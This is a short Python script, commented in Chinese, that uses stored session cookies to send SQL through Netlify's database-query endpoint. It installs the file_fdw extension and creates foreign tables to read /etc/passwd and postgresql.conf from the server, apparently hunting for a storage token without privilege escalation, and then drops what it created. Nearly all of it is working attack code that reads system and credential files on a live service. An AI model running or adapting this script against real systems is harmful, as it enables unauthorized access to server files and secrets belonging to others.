# -*- coding: utf-8 -*-
"""file_fdw 技术测试:trusted 扩展安装 + foreign table 读服务器文件
若成功 = 无需提权直接读 postgresql.conf(storage_token)
全程只读,测完清理(drop foreign table/server/extension)"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=45)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2000].decode('utf-8', 'ignore')
    conn.close()
    return st, out


steps = [
    ('1. create extension file_fdw', 'create extension if not exists file_fdw'),
    ('2. create server', "create server if not exists fs_x foreign data wrapper file_fdw"),
    ('3. ft /etc/passwd', "create foreign table if not exists ft_passwd(line text) server fs_x options (filename '/etc/passwd', format 'text')"),
    ('4. read passwd', "select line from ft_passwd limit 3"),
    ('5. ft postgresql.conf', "create foreign table if not exists ft_pgc(line text) server fs_x options (filename '/etc/postgresql/postgresql.conf', format 'text')"),
    ('5b. read pgc head', "select line from ft_pgc limit 1"),
    ('6. find conf path', "select name, setting from pg_settings where name='config_file'"),
    ('7. clean', 'drop table if exists ft_passwd, ft_pgc'),
    ('8. clean server', 'drop server if exists fs_x'),
    ('9. clean ext', 'drop extension if exists file_fdw'),
]
for desc, sql in steps:
    st, out = q(sql)
    print('%-28s [%d] %s' % (desc, st, out[:400]))
